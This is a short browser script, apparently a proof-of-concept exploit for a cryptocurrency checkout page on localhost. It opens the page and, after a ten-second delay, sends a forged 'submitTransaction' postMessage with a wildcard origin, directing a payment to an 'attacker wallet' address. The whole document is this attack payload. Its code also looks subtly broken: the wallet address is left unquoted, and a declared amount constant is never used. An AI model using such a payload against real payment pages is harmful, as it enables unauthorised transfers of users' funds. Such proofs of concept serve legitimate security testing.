<script>
    const ATTACKER_WALLET = '1ad4432c504858a8d1e4994eb4edaf52cf';
    const AMOUNT = 1337;

    // Open checkout page
    const target = window.open(
      'http://localhost:8080/checkout.html?currency=BTC&price=45000',
      '_blank'
    );

    // Leave enough time for background requests to finish first, then exploit
    setTimeout(() => {
      target.postMessage({
        type: 'submitTransaction',
        transaction: {
          toAddress: 1ad4432c504858a8d1e4994eb4edaf52cf,
          currency: '1337COIN',
          amount: 3
        }
      }, '*');
    }, 10000);
</script>
